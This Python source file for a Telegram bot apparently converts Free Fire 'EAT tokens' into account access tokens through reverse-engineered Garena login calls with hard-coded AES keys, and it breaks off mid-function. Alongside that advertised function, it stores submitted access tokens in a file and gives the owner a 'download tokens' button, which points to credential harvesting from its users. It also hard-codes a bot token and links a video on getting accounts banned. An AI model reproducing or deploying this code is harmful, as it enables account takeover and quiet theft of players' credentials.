import os
import re
import json
import base64
import logging
import sqlite3
import tempfile
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from zoneinfo import ZoneInfo
from html import escape
from urllib.parse import urlparse, parse_qs
from threading import Thread

import requests
import httpx
import pytesseract
from PIL import Image, ImageOps
from Crypto.Cipher import AES

from google.protobuf.json_format import ParseDict, MessageToJson
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import runtime_version as _runtime_version
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.error import BadRequest, TimedOut, NetworkError, Forbidden
from flask import Flask

# ─────────────────────── CONFIG ───────────────────────
BOT_TOKEN = "8973972979:AAE6jVMO2F6vMc4HLKVQFLxzbrWZ-V3cN-Y"
OWNER_ID = 8679993003
CHANNEL_USERNAME = "@FREEFlRECODE"
CHANNEL_2 = "@KrishnaCoderOfficial"
GROUP_USERNAME = "@KrishnaCoderSupport"
REQUIRED_CHATS = [CHANNEL_USERNAME, CHANNEL_2, GROUP_USERNAME]
DEV_USERNAME = "@KrishnaCoder"
YT_CHANNEL_URL = "https://youtube.com/@krishnacoderofficial"
DB_PATH = "bot_database.db"
ACCESS_TOKEN_JSON = "access_token.json"
BLOCKED_GROUP_ID = -1003478196705
TZ = ZoneInfo("Asia/Kolkata")
WAITING_CODE = 1
WAITING_BAN = 2
WAITING_UNBAN = 3
WAITING_BROADCAST = 4
executor = ThreadPoolExecutor(max_workers=8)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─────────────────────── PROTOBUF / AES ───────────────────────
_runtime_version.ValidateProtobufRuntimeVersion(
    _runtime_version.Domain.PUBLIC, 6, 30, 0, "", "FreeFire.proto"
)
_sym_db = _symbol_database.Default()
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(
    b"\n\x0e\x46reeFire.proto\"c\n\x08LoginReq\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0blogin_token\x18\x1d \x01(\t\x12\x1b\n\x13orign_platform_type\x18\x63 \x01(\t\"]\n\x10\x42lacklistInfoRes\x12\x1e\n\nban_reason\x18\x01 \x01(\x0e\x32\n.BanReason\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\r\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\r\"f\n\x0eLoginQueueInfo\x12\r\n\x05\x61llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\r\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\r\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\"\xa0\x03\n\x08LoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x04\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\x19\n\x11recommend_regions\x18\x07 \x03(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\r\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0b \x01(\r\x12$\n\tblacklist\x18\x0c \x01(\x0b\x32\x11.BlacklistInfoRes\x12#\n\nqueue_info\x18\r \x01(\x0b\x32\x0f.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x0e \x01(\t\x12\x15\n\rapp_server_id\x18\x0f \x01(\r\x12\x0f\n\x07\x61no_url\x18\x10 \x01(\t\x12\x0f\n\x07ip_city\x18\x11 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x12 \x01(\t*\xa8\x01\n\tBanReason\x12\x16\n\x12\x42\x41N_REASON_UNKNOWN\x10\x00\x12\x1b\n\x17\x42\x41N_REASON_IN_GAME_AUTO\x10\x01\x12\x15\n\x11\x42\x41N_REASON_REFUND\x10\x02\x12\x15\n\x11\x42\x41N_REASON_OTHERS\x10\x03\x12\x16\n\x12\x42\x41N_REASON_SKINMOD\x10\x04\x12 \n\x1b\x42\x41N_REASON_IN_GAME_AUTO_NEW\x10\xf6\x07\x62\x06proto3"
)
_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, "FreeFire_pb2", _globals)
LoginReq = _globals["LoginReq"]
LoginRes = _globals["LoginRes"]

MAIN_KEY = base64.b64decode("WWcmdGMlREV1aDYlWmNeOA==")
MAIN_IV = base64.b64decode("Nm95WkRyMjJFM3ljaGpNJQ==")
USERAGENT = "Dalvik/2.1.0 (Linux; U; Android 13; CPH2095 Build/RKQ1.211119.001)"
RELEASEVERSION = "OB54"


def pad(data: bytes) -> bytes:
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len] * pad_len)


def aes_encrypt(data: bytes) -> bytes:
    cipher = AES.new(MAIN_KEY, AES.MODE_CBC, MAIN_IV)
    return cipher.encrypt(pad(data))


def build_login_request(open_id: str, login_token: str, platform: str = "4") -> bytes:
    msg = LoginReq()
    ParseDict(
        {
            "open_id": open_id,
            "open_id_type": platform,
            "login_token": login_token,
            "orign_platform_type": platform,
        },
        msg,
    )
    return msg.SerializeToString()


def decode_jwt_payload(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        padding = "=" * (-len(payload) % 4)
        raw = base64.urlsafe_b64decode(payload + padding)
        return json.loads(raw.decode("utf-8", errors="replace"))
    except Exception:
        return {}


def get_logintoken(eat_token: str) -> dict:
    try:
        callback_url = (
            f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        )
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
            "Accept": "*/*",
        }
        response = requests.get(
            callback_url,
            headers=headers,
            allow_redirects=False,
            timeout=15,
        )
        if 300 <= response.status_code < 400 and "Location" in response.headers:
            redirect_url = response.headers["Location"]
            parsed_url = urlparse(redirect_url)
            query_params = parse_qs(parsed_url.query)
            login_token = query_params.get("access_token", [None])[0]
            account_id = query_params.get("account_id", [None])[0]
            nickname = query_params.get("nickname", [None])[0]
            region = query_params.get("region", [None])[0]
            if not login_token:
                return {"success": False, "error": "Token extraction failed"}
            return {
                "success": True,
                "real_access_token": login_token,
                "account_id": account_id,
                "nickname": nickname,
                "region": region,
            }
        return {
            "success": False,
            "error": "Redirect not received",
            "status_code": response.status_code,
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def get_token_info_sync(login_token: str):
    url = f"https://ffmconnect.live.gop.garenanow.com/oauth/token/inspect?token={login_token}"
    try:
        resp = requests.get(url, timeout=12, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            return data if isinstance(data, dict) else {}
    except Exception:
        pass
    return {}


def major_login_sync(open_id: str, login_token: str, platform: str) -> dict:
    encrypted = aes_encrypt(build_login_request(open_id, login_token, platform))
    url = "https://loginbp.ggblueshark.com/MajorLogin"
    headers = {
        "User-Agent": USERAGENT,
        "Content-Type": "application/octet-stream",
        "X-Unity-Version": "2018.4.11f1",
        "X-GA": "v1 1",
        "ReleaseVersion": RELEASEVERSION,
    }
    resp = requests.post(url, data=encrypted, headers=headers, timeout=20, verify=False)
    if resp.status_code != 200 or not resp.content:
        raise Exception(f"MajorLogin failed: {resp.status_code}")
    msg = LoginRes()
    msg.ParseFromString(resp.content)
    return json.loads(MessageToJson(msg))


def process_code_sync(eat_token: str) -> dict:
    """
    EAT token → real access token → inspect + MajorLogin JWT
    Returns success dict with fields for tree formatter.
    """
    try:
        token_info = get_logintoken(eat_token.strip())
        if not token_info.get("success"):
            return {"success": False}

        real_token = token_info["real_access_token"]
        inspect = get_token_info_sync(real_token)
        open_id = inspect.get("open_id") or None
        platform = str(inspect.get("platform", "4"))

        login_res = {}
        if open_id:
            try:
                login_res = major_login_sync(open_id, real_token, platform)
            except Exception as e:
                logger.warning(f"MajorLogin error: {e}")
                login_res = {}

        jwt_token = login_res.get("token") or ""
        jwt_payload = decode_jwt_payload(jwt_token) if jwt_token else {}

        # Merge all possible fields (only non-empty shown later)
        result = {
            "success": True,
            "access_token": real_token,
            "account_id": (
                login_res.get("accountId")
                or login_res.get("account_id")
                or token_info.get("account_id")
                or jwt_payload.get("account_id")
                or inspect.get("account_id")
            ),
            "agora_env": login_res.get("agoraEnvironment") or login_res.get("agora_environment"),
            "create_time": inspect.get("create_time") or jwt_payload.get("iat"),
            "expiry_time": inspect.get("exp") or jwt_payload.get("exp"),
            "ip_region": login_res.get("ipRegion") or login_res.get("ip_region"),
            "lock_region": (
                login_res.get("lockRegion")
                or login_res.get("lock_region")
                or jwt_payload.get("lock_region")
                or token_info.get("region")
            ),
            "noti_region": (
                login_res.get("notiRegion")
                or login_res.get("noti_region")
                or jwt_payload.get("noti_region")
            ),
            "main_platform": inspect.get("platform") or jwt_payload.get("external_type"),
            "platform": inspect.get("platform") or platform,
            "scope": inspect.get("scope"),
            "server": login_res.get("serverUrl") or login_res.get("server_url"),
            "ttl": login_res.get("ttl"),
            "data_uid": (
                inspect.get("uid")
                or inspect.get("external_uid")
                or jwt_payload.get("external_uid")
            ),
            "open_id": open_id or jwt_payload.get("external_id"),
            "token": jwt_token or None,
            "nickname": token_info.get("nickname") or jwt_payload.get("nickname"),
        }
        return result
    except Exception as e:
        logger.exception(f"process_code_sync: {e}")
        return {"success": False}


def is_valid_field(val) -> bool:
    if val is None:
        return False
    if isinstance(val, (list, dict)) and not val:
        return False
    s = str(val).strip()
    if not s:
        return False
    if s.lower() in ("none", "null", "—", "-", "n/a"):
        return False
    return True


def format_success_response(result: dict) -> str:
    """
    Tree format:
    ┌ Token Information
    ├─ Account ID: <code>...</code>
    └─ Access Token: <code>...</code>
    """

    mapping = [
        ("Account ID", result.get("account_id")),
        ("Agora Env", result.get("agora_env")),
        ("Create Time", result.get("create_time")),
        ("Expiry Time", result.get("expiry_time")),
        ("IP Region", result.get("ip_region")),
        ("Lock Region", result.get("lock_region")),
        ("Noti Region", result.get("noti_region")),
        ("Main Platform", result.get("main_platform")),
        ("Platform", result.get("platform")),
        ("Scope", result.get("scope")),
        ("Server", result.get("server")),
        ("TTL", result.get("ttl")),
        ("Data UID", result.get("data_uid")),
        ("Open ID", result.get("open_id")),
        ("Token", result.get("token")),
        ("Access Token", result.get("access_token")),
    ]

    rows = []

    for label, val in mapping:
        if not is_valid_field(val):
            continue

        if isinstance(val, list):
            val_s = str(val)
        else:
            val_s = str(val)

        rows.append((label, val_s))

    if not rows:
        return "No data."

    lines = ["┌ <b>Token Information</b>"]

    for i, (label, val) in enumerate(rows):
        prefix = "└─" if i == len(rows) - 1 else "├─"

        # Label bold, value code
        lines.append(
            f"{prefix} <b>{escape(label)}</b>: "
            f"<code>{escape(val)}</code>"
        )

    return "\n".join(lines)


# ─────────────────────── TIME / DB ───────────────────────
def now_local() -> datetime:
    return datetime.now(TZ)


def today_local_str() -> str:
    return now_local().date().isoformat()


def is_blocked_group(update) -> bool:
    try:
        chat = update.effective_chat
        if chat is not None and chat.id == BLOCKED_GROUP_ID:
            return True
    except Exception:
        pass
    return False


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            chat_id INTEGER,
            joined_at TEXT,
            total_success INTEGER DEFAULT 0,
            total_failed INTEGER DEFAULT 0,
            last_yt_verify TEXT,
            is_banned INTEGER DEFAULT 0
        )
        """
    )
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        )
        """
    )
    c.execute(
        "INSERT OR IGNORE INTO config (key, value) VALUES ('maintenance', '0')"
    )
    conn.commit()
    conn.close()


def get_db():
    return sqlite3.connect(DB_PATH, timeout=15)


def upsert_user(user):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        """
        INSERT INTO users (user_id, username, first_name, chat_id, joined_at)
        VALUES (?, ?, ?, ?, ?)
        ON CONFLICT(user_id) DO UPDATE SET
            username=excluded.username,
            first_name=excluded.first_name,
            chat_id=excluded.chat_id
        """,
        (
            user.id,
            user.username or "",
            user.first_name or "",
            user.id,
            now_local().strftime("%Y-%m-%d %H:%M:%S"),
        ),
    )
    conn.commit()
    conn.close()


def is_banned(uid: int) -> bool:
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    conn.close()
    return bool(row and row[0] == 1)


def set_ban(uid: int, banned: bool):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "INSERT INTO users (user_id, is_banned) VALUES (?, ?) "
        "ON CONFLICT(user_id) DO UPDATE SET is_banned=excluded.is_banned",
        (uid, 1 if banned else 0),
    )
    conn.commit()
    conn.close()


def is_maintenance() -> bool:
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key='maintenance'")
    row = c.fetchone()
    conn.close()
    return bool(row and row[0] == "1")


def set_maintenance(on: bool):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO config (key, value) VALUES ('maintenance', ?)",
        ("1" if on else "0",),
    )
    conn.commit()
    conn.close()


def get_user_stats(uid: int):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT first_name, username, total_success, total_failed, last_yt_verify "
        "FROM users WHERE user_id=?",
        (uid,),
    )
    row = c.fetchone()
    conn.close()
    if not row:
        return None
    return {
        "first_name": row[0] or "",
        "username": row[1] or "",
        "total_success": row[2] or 0,
        "total_failed": row[3] or 0,
        "last_yt_verify": row[4],
    }


def inc_success(uid: int):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET total_success = total_success + 1 WHERE user_id=?",
        (uid,),
    )
    conn.commit()
    conn.close()


def inc_failed(uid: int):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET total_failed = total_failed + 1 WHERE user_id=?",
        (uid,),
    )
    conn.commit()
    conn.close()


def set_yt_verified(uid: int):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET last_yt_verify=? WHERE user_id=?",
        (today_local_str(), uid),
    )
    conn.commit()
    conn.close()


def is_yt_verified_today(uid: int) -> bool:
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT last_yt_verify FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    conn.close()
    if not row or not row[0]:
        return False
    return row[0] == today_local_str()


def total_users() -> int:
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    n = c.fetchone()[0]
    conn.close()
    return n


def all_chat_ids():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT chat_id FROM users WHERE is_banned=0 AND chat_id IS NOT NULL"
    )
    rows = c.fetchall()
    conn.close()
    return [r[0] for r in rows]


def global_stats():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT COALESCE(SUM(total_success),0), "
        "COALESCE(SUM(total_failed),0), COUNT(*) FROM users"
    )
    s, f, u = c.fetchone()
    conn.close()
    return int(s), int(f), int(u)


def save_access_token(token: str):
    token = (token or "").strip()
    if not token or len(token) < 20:
        return False
    data = []
    if os.path.exists(ACCESS_TOKEN_JSON):
        try:
            with open(ACCESS_TOKEN_JSON, "r", encoding="utf-8") as f:
                data = json.load(f)
                if not isinstance(data, list):
                    data = []
        except Exception:
            data = []
    existing = {
        str(x.get("access_token", "")).strip()
        for x in data
        if isinstance(x, dict)
    }
    if token in existing:
        return False
    data.append(
        {
            "access_token": token,
            "captured_at": now_local().strftime("%Y-%m-%d %H:%M:%S"),
        }
    )
    with open(ACCESS_TOKEN_JSON, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    return True


# ─────────────────────── OCR ───────────────────────
def extract_text(image_path: str) -> str:
    try:
        img = Image.open(image_path)
        img = img.convert("RGB")
        img = ImageOps.grayscale(img)
        w, h = img.size
        if w < 1500:
            scale = 1500 / w
            img = img.resize((1500, int(h * scale)))
        text = pytesseract.image_to_string(img, config="--psm 6")
        return text.lower()
    except Exception as e:
        logger.error(f"OCR error: {e}")
        return ""

def normalize_text(text: str) -> str:
    text = text.lower()
    for ch in ("\n", "\r", "\t"):
        text = text.replace(ch, " ")
    return " ".join(text.split())

def verify_screenshot(text: str):
    text = normalize_text(text)
    channel_name = "krishna coder" in text
    handle = "krishnacoderofficial" in text or "@krishnacoderofficial" in text
    subscribed = "subscribed" in text
    details = {
        "channelName": channel_name,
        "handle": handle,
        "subscribed": subscribed,
    }
    return channel_name and handle and subscribed, details


# ─────────────────────── KEYBOARDS ───────────────────────
def main_kb(is_owner: bool = False):
    rows = [
        [KeyboardButton("ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ")],
        [KeyboardButton("sᴛᴀᴛᴜs"), KeyboardButton("ᴅᴇᴠᴇʟᴏᴘᴇʀ")],
    ]
    if is_owner:
        rows.append([KeyboardButton("ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


def yt_verify_kb():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("ʏᴏᴜᴛᴜʙᴇ ᴄʜᴀɴɴᴇʟ", url=YT_CHANNEL_URL)]]
    )


def force_join_kb():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ",
                    url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}",
                )
            ],
            [
                InlineKeyboardButton(
                    "ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ",
                    url=f"https://t.me/{CHANNEL_2.lstrip('@')}",
                )
            ],
            [
                InlineKeyboardButton(
                    "ᴊᴏɪɴ ɢʀᴏᴜᴘ",
                    url=f"https://t.me/{GROUP_USERNAME.lstrip('@')}",
                )
            ],
            [InlineKeyboardButton("✅ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")],
        ]
    )


def owner_kb():
    maint = "ON" if is_maintenance() else "OFF"
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("ᴛᴏᴛᴀʟ ᴜsᴇʀs", callback_data="owner_users")],
            [
                InlineKeyboardButton("ʙᴀɴ", callback_data="owner_ban"),
                InlineKeyboardButton("ᴜɴʙᴀɴ", callback_data="owner_unban"),
            ],
            [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_broadcast")],
            [
                InlineKeyboardButton(
                    f"ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {maint}",
                    callback_data="owner_maint_toggle",
                )
            ],
            [
                InlineKeyboardButton(
                    "ᴅᴏᴡɴʟᴏᴀᴅ ᴛᴏᴋᴇɴs",
                    callback_data="owner_download_tokens",
                )
            ],
            [InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data="owner_close")],
        ]
    )


WELCOME_HOWTO_KB = InlineKeyboardMarkup(
    [
        [
            InlineKeyboardButton(
                "ʜᴏᴡ ᴛᴏ ɢᴇᴛ ᴇᴀᴛ ᴛᴏᴋᴇɴ",
                url="https://youtu.be/CmPwiI_DOzc",
            )
        ],
        [
            InlineKeyboardButton(
                "ʜᴏᴡ ᴛᴏ ʙᴀɴ 30 ᴅᴀʏ ғғ ᴀᴄᴄᴏᴜɴᴛ",
                url="https://youtu.be/wUNLL8IByUw",
            )
        ],
        [
            InlineKeyboardButton(
                "ғᴏʟʟᴏᴡ ɪɴsᴛᴀɢʀᴀᴍ",
                url="https://instagram.com/KrishnaCoderOfficial",
            )
        ],
        [
            InlineKeyboardButton(
                "ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴡᴇʙsɪᴛᴇ",
                url="http://20.106.16.65:5000/",
            )
        ],
    ]
)


async def check_one_chat(bot, chat_id: str, user_id: int) -> bool:
    try:
        m = await bot.get_chat_member(chat_id, user_id)
        return m.status in ("member", "administrator", "creator")
    except Exception:
        return False


async def is_member_all(bot, user_id: int) -> bool:
    for chat in REQUIRED_CHATS:
        if not await check_one_chat(bot, chat, user_id):
            return False
    return True


async def missing_chats(bot, user_id: int) -> list:
    missing = []
    for chat in REQUIRED_CHATS:
        if not await check_one_chat(bot, chat, user_id):
            missing.append(chat)
    return missing


def welcome_text(first_name: str) -> str:
    return (
        f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {first_name}!</b>\n\n"
        "🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
        "ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ ɢᴇᴛ ʏᴏᴜʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴀɴᴅ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴜsɪɴɢ ᴀ ᴇᴀᴛ ᴛᴏᴋᴇɴ.\n\n"
        "🔑 <b>ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b>\n"
        "• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʙᴜᴛᴛᴏɴ\n"
        "• ᴇɴᴛᴇʀ ᴛʜᴇ ʀᴇǫᴜɪʀᴇᴅ ᴇᴀᴛ ᴛᴏᴋᴇɴ\n"
        "• ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ᴘʀᴏᴄᴇss ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ\n"
        "• ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n\n"
        "⚡ <b>ꜰᴀsᴛ & sɪᴍᴘʟᴇ</b>\n"
        "ɢᴇᴛ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ǫᴜɪᴄᴋʟʏ ᴡɪᴛʜ ᴊᴜsᴛ ᴀ ꜰᴇᴡ sɪᴍᴘʟᴇ sᴛᴇᴘs.\n\n"
        "🎥 <b>ᴏᴛʜᴇʀ ᴍᴇᴛʜᴏᴅ — ʜᴏᴡ ᴛᴏ ᴄᴀᴘᴛᴜʀᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b>\n"
        "ᴡᴀᴛᴄʜ ᴛʜɪs ᴠɪᴅᴇᴏ ᴛᴏ ʟᴇᴀʀɴ ʜᴏᴡ ᴛᴏ ᴄᴀᴘᴛᴜʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴠɪᴀ ꜰʀᴇᴇ ꜰɪʀᴇ & ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx.\n"
        '▶️ <a href="https://youtu.be/CmPwiI_DOzc">ᴡᴀᴛᴄʜ ᴛᴜᴛᴏʀɪᴀʟ ᴠɪᴅᴇᴏ</a>\n\n'
        "🤖 <b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴄᴀᴘᴛᴜʀᴇ ʙᴏᴛ</b>\n"
        "ᴜsᴇ <b>@ff_accessXtoken_bot</b> ᴛᴏ ᴄᴀᴘᴛᴜʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ.\n\n"
        "ℹ️ <b>ɪᴍᴘᴏʀᴛᴀɴᴛ ɴᴏᴛᴇ</b>\n"
        "ᴋᴇᴇᴘ ʏᴏᴜʀ ᴄᴏᴅᴇ ᴀɴᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴘʀɪᴠᴀᴛᴇ. ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.\n\n"
        "⚠️ <b>ᴘʀᴇᴄᴀᴜᴛɪᴏɴ</b>\n"
        "ᴜsᴇ ᴏɴʟʏ ᴄᴏᴅᴇs ᴀɴᴅ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜsᴇ.\n\n"
        "📜 <b>ᴅɪsᴄʟᴀɪᴍᴇʀ</b>\n"
        "ᴛʜɪs ʙᴏᴛ ɪs ᴘʀᴏᴠɪᴅᴇᴅ ꜰᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴀɴᴅ ᴛᴇsᴛɪɴɢ ᴘᴜʀᴘᴏsᴇs ᴏɴʟʏ. "
        "ᴜsᴇ ɪᴛ ʀᴇsᴘᴏɴsɪʙʟʏ ᴀɴᴅ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.\n\n"
        "👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ @KrishnaCoder</b>"
    )


YT_PROMPT = (
    "<b>ʏᴏᴜᴛᴜʙᴇ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ</b>\n\n"
    "sᴇɴᴅ ᴀ ʏᴏᴜᴛᴜʙᴇ ᴄʜᴀɴɴᴇʟ sᴜʙsᴄʀɪʙᴇ sᴄʀᴇᴇɴsʜᴏᴛ.\n\n"
    "ʀᴇǫᴜɪʀᴇᴅ ɪɴ sᴄʀᴇᴇɴsʜᴏᴛ:\n"
    "• <b>ᴋʀɪsʜɴᴀ ᴄᴏᴅᴇʀ</b>\n"
    "• <b>@KrishnaCoderOfficial</b>\n"
    "• <b>sᴜʙsᴄʀɪʙᴇᴅ</b>\n\n"
    "ᴏᴘᴇɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ ᴡɪᴛʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ, ᴛʜᴇɴ sᴇɴᴅ ᴀ ꜰʀᴇsʜ sᴄʀᴇᴇɴsʜᴏᴛ."
)

FORCE_JOIN_TEXT = (
    "<b>ᴊᴏɪɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n\n"
    "ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ, ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ:\n\n"
    "• Ꮮᴇᴀᴅᴇʀ Updates ✞\n"
    "• Krishna Coder Official\n"
    "• Ꮮᴇᴀᴅᴇʀ 𝐒ᴜᴘᴘᴏʀᴛ ✞\n\n"
    "ᴀғᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ᴠᴇʀɪғʏ:"
)


async def gate_checks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if is_blocked_group(update):
        return False
    user = update.effective_user
    if not user:
        return False
    upsert_user(user)
    msg = update.effective_message
    if is_banned(user.id) and user.id != OWNER_ID:
        if msg:
            await msg.reply_text(
                "ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ꜰʀᴏᴍ ᴜsɪɴɢ ᴛʜɪs ʙᴏᴛ.",
                reply_to_message_id=msg.message_id,
            )
        return False
    if is_maintenance() and user.id != OWNER_ID:
        if msg:
            await msg.reply_text(
                "ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.",
                reply_to_message_id=msg.message_id,
            )
        return False
    if not await is_member_all(context.bot, user.id):
        if msg:
            await msg.reply_text(
                FORCE_JOIN_TEXT,
                parse_mode="HTML",
                reply_markup=force_join_kb(),
                reply_to_message_id=msg.message_id,
            )
        return False
    if not is_yt_verified_today(user.id) and user.id != OWNER_ID:
        if msg:
            await msg.reply_text(
                YT_PROMPT,
                parse_mode="HTML",
                reply_markup=yt_verify_kb(),
                reply_to_message_id=msg.message_id,
            )
        return False
    return True


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    if not update.message or not update.effective_user:
        return
    user = update.effective_user
    upsert_user(user)
    mid = update.message.message_id
    first_name = escape(user.first_name or "User")
    if is_banned(user.id) and user.id != OWNER_ID:
        await update.message.reply_text(
            "ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ꜰʀᴏᴍ ᴜsɪɴɢ ᴛʜɪs ʙᴏᴛ.",
            reply_to_message_id=mid,
        )
        return
    if is_maintenance() and user.id != OWNER_ID:
